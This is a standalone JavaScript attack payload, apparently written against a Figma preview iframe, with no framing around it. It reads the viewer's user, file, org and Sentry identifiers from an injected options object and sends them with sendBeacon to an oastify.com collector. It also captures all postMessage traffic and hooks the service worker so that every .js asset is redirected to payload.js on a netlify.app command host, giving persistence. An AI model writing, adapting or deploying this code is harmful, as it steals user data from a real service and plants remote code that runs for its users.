  (function () {
    const C2  = 'https://gleeful-creponne-8ff162.netlify.app';
    const OOB = 'https://n6u4chbqezxncoq47ydz4ge9q0wrkh86.oastify.com';

    function exfil(tag, data) {
      navigator.sendBeacon(OOB + '/p?t=' + tag, JSON.stringify(data));
    }

    // Primary target — sensitive viewer data injected by figma.com
    const opts = window.__PREVIEW_IFRAME_INITIAL_OPTIONS__ || {};
    exfil('victim', {
      user_id:    opts.user_id,
      file_key:   opts.file_key,
      org_id:     opts.org_id,
      cluster:    opts.cluster,
      sentry_dsn: opts.sentry_dsn,
      git_commit: opts.git_commit,
      origin:     location.origin,
      href:       location.href
    });

    // postMessage sniffer
    window.addEventListener('message', e => {
      exfil('pm', { from: e.origin, data: (typeof e.data === 'string' ? e.data : JSON.stringify(e.data)).slice(0, 500)
  });
    }, true);

    // Re-hook SW for persistence
    if (navigator.serviceWorker && navigator.serviceWorker.controller) {
      const ctrl = navigator.serviceWorker.controller;
      const orig = ctrl.postMessage.bind(ctrl);
      ctrl.postMessage = function(msg) {
        if (msg && msg.type === 'update-asset-url-map' && msg.assets) {
          const poisoned = {...msg.assets};
          for (const k of Object.keys(poisoned))
            if (k.endsWith('.js')) poisoned[k] = C2 + '/payload.js';
          return orig({...msg, assets: poisoned});
        }
        return orig(msg);
      };
      exfil('sw_rehooked', { scope: navigator.serviceWorker.controller.scriptURL });
    }
  })();
